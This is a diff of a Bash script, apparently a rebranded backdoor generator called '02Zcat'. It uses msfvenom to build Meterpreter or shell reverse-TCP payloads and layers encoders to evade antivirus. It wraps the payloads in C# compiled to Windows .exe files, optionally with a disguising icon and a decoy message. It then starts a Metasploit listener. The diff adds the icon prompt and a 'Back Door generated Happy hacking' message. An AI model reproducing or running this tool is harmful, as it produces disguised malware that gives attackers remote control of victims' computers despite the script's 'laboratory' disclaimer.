@@ -15,11 +15,10 @@ cat << !
       We recommend the use in a controlled laboratory.       By Staff Haxk.Ur
 
 !
-
 sleep 2
 # Check root
 if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
-echo -e '\e[0;31m【!!】 Root OK \e[0m' 1>&2
+echo -e '\e[0;31m【!!】 This 02Zcat root permission\e[0m' 1>&2
 exit
 fi
 dir=`pwd`
@@ -32,7 +31,7 @@ mkdir $dir/handler
 
 bar ()
 {
-BAR='************************************************'    
+BAR='*******************************************'    
                          
 for i in {1..35}; do
     echo -ne "\r${BAR:0:$i}" 
@@ -93,7 +92,7 @@ echo -n Dependencies = =;
 
 sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
 if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$mono" == "1" ] && [ "$mcs" == "1" ] && [ "$postgresql" == "1" ] && [ "$fallocate" == "1" ]; then
-echo -en "\b【\e[1;33mall OK\e[0m】" 
+echo -en "\b【\e[1;33mAll Ok\e[0m】" 
 echo ""
 echo ""
 echo -e '\e[0;31mmsfconsole\e[0m    【\e[1;33mOk\e[0m】'
@@ -113,33 +112,36 @@ echo ""
 echo ""
 fi
 if [ "$msfconsole" == "0" ] ;then 
-echo -e 'msfconsole    \e[0;31m【!!】 Not Found, please installed metasploit\e[0m';
+echo -e 'msfconsole    \e[0;31m【!!】 Installed metasploit\e[0m';
 fi
 if [ "$msfvenom" == "0" ] ;then 
-echo -e 'msfvenom      \e[0;31m【!!】 Not Found, please be install metasploit\e[0m';
+echo -e 'msfvenom      \e[0;31m【!!】 Install metasploit\e[0m';
 fi
 if [ "$mono" == "0" ] ;then
-echo -e 'mono          \e[0;31m【!!】 Not Found, please be installed mono \e[0m';
+echo -e 'mono          \e[0;31m【!!】 Installed mono \e[0m';
 fi
 if [ "$mcs" == "0" ] ;then
-echo -e 'mcs           \e[0;31m【!!】 Not Found, please be installed mono\e[0m';
+echo -e 'mcs           \e[0;31m【!!】 Installed mono\e[0m';
 fi
 if [ "$postgresql" == "0" ] ;then
-echo -e 'postgresql    \e[0;31m【!!】 Not Found, please be installed postgresql\e[0m';
+echo -e 'postgresql    \e[0;31m【!!】 Installed postgresql\e[0m';
 fi
 if [ "$fallocate" == "0" ] ;then
-echo -e 'fallocate     \e[0;31m【!!】 Not Found, please be installed fallocate\e[0m';
+echo -e 'fallocate     \e[0;31m【!!】 Installed fallocate\e[0m';
 fi
 if [ "$fail" == "1" ]; then
 echo ""
 sleep 2
 echo -e '\e[0;31mScript require dependencies\e[0m'
+echo -e '\e[0;31mMore information:\e[0m'  
+echo -e '\e[0;31mhttps://www.metasploit.com/\e[0m'
+echo -e '\e[0;31mhttp://www.mono-project.com/\e[0m'
+echo -e '\e[0;31mhttps://www.postgresql.org/\e[0m' 
 sleep 2
 echo ""
 echo -e '\e[0;31m***********ERROR***********\e[0m'
 exit
 fi
-
 
 echo "**********************************************************************************" 
 echo "*     1-  Meterpreter_Reverse_tcp		   5- Shell_reverse_tcp          *"
@@ -190,7 +192,7 @@ exit
 ;;
 * )
 if [[ $int -gt 500 || $int = 0 ]]; then
-echo -e '\e[0;31m【!!】 ERROR , write a number between 1-500 \e[0m';
+echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-500 \e[0m';
 exit
 fi 
 ;;
@@ -202,52 +204,60 @@ echo -e "Set No-Ip Host: \c"
 read host
 fi
 
-echo -e "LHOST: \c"
+echo -e "LHOST => \c"
 read ip
 if [[ "$ip" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
 sleep 0.1
 else
-echo -e '\e[0;31m【!!】 Invalid LHOST \e[0m';
+echo -e '\e[0;31m【!!】 Invalid LHOST\e[0m';
 exit
 fi
 
 #Port
-echo -e "LPORT: \c"
+echo -e "LPORT => \c"
 read port
 case ${port#[+]} in
 *[!0-9]* ) 
-echo -e '\e[0;31m【!!】 Invalide LPORT\e[0m'
+echo -e '\e[0;31m【!!】 Invalid LPORT \e[0m'
 exit
 ;;
 * )
 if [[ $port -gt 65535 || $port = 0 ]]; then
-echo -e '\e[0;31m【!!】 ERROR , write a number between 1-65535 \e[0m';
+echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-65535 \e[0m';
 exit
 fi 
 ;;
 esac
 
+#ikonoa
+echo -e "backdoor icon? y or n : \c"
+read icon
+if [[ $icon != "y" && $icon != "n" ]]; then 
+echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
+exit
+fi
+
 #Mezua
-echo -e "Message? y or n : \c"
+echo -e "Display an message? y or n : \c"
 read error
 case $error in
 y) 
-echo -e "Write title message : \c"
+echo -e "Title message : \c"
 read izenburua  
-echo -e "Write message : \c"
+echo -e "Message : \c"
 read textua
 ;;
 n)
 ;;
 *)
-echo -e '\e[0;31m【!!】 ERROR, write y or n \e[0m'
+echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
 exit
 ;;
 esac
 echo -e "Enter file name: \c"
 read izena
 echo ""
-echo "Please wait****"
+echo "Please wait"
 bar
 if [ "$option" == "7" ]; then
 msfvenom -p $payload LHOST=$ip LPORT=$port --platform windows -a x86 -e generic/none 2>/dev/null | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -i $int -f raw 2>/dev/null | msfvenom --platform windows -a x86 -e x86/fnstenv_mov -i $int -f hex >> behinbehineko 2>/dev/null;
@@ -318,13 +328,13 @@ echo "}}}}" >> Kodea
 
 #kompilatu
 if [ "$icon" == "y" ] && [ "$error" == "n" ]; then 
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/Zcat.ico -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
 mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
 mcs -platform:x86 -unsafe Kodea -out:$dir/output/$izena.exe
 elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/Zcat.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 fi
 
 #aldaketa
@@ -337,7 +347,8 @@ sleep 1
 echo ""
 echo -e '\e[0;31mCONGRATULATIONS  Back Door generated Happy hacking.....!!\e[0m'
 echo ""
-echo -e '\e[0;31mBACKDOOR FILE\e[0m= 02Zcat/output/'
+echo "Payload file= $dir/output/$izena.exe"
+echo "Payload size= `stat -c %s $dir/output/$izena.exe` Bytes"
 echo ""
 sleep 2
 echo ""
@@ -361,7 +372,7 @@ echo "exploit -j" >> $dir/handler/handler.rc
 msfconsole -r $dir/handler/handler.rc
 sleep 2
 else
-echo -e '\e[0;31mExiting....\e[0m'
+echo -e '\e[0;31mExit....\e[0m'
 sleep 1
 exit
 fi
